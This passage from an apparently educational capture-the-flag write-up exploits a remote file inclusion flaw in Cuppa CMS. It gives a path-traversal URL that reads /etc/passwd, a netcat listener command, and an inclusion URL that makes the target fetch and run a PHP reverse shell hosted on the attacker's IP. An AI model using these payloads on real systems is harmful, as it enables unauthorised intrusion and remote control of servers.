At this point, we have access to a hidden subdirectory containing a Cuppa login form. We don't have much to go on, but a quick searchsploit search for Cuppa shows the existence of a [remote file inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion) exploit.

<center>

![7625f4004a5627aa9cdd25797e853595.png](../../_resources/7625f4004a5627aa9cdd25797e853595.png)

</center>

We'll use the exploit from [exploit-db](https://www.exploit-db.com/exploits/25971). To use it, we simply append `/alerts/alertConfigField.php?urlConfig=<path to file>` to the current url (where we found the login page). For instance, we can view the `/etc/passwd` file by navigating to `/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`. However, what we would like to do is set up a reverse shell using this method.

Set up a netcat lister with `rlwrap nc -lvnp 9999`. Download and modify [Pentestmonkey's php reverse shell script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), host it on an http server with `python3 -m http.server,` and use the above exploit to navigate to `/alerts/alertConfigField.php?urlConfig=http://10.6.30.43:8000/php-reverse-shell.php`. After a short while, the target machine completes the request, download the reverse shell php script, and we obtain a reverse shell.

<center>

![c805141dd6b0c16cf4845b1bb05e7171.png](../../_resources/c805141dd6b0c16cf4845b1bb05e7171.png)

</center>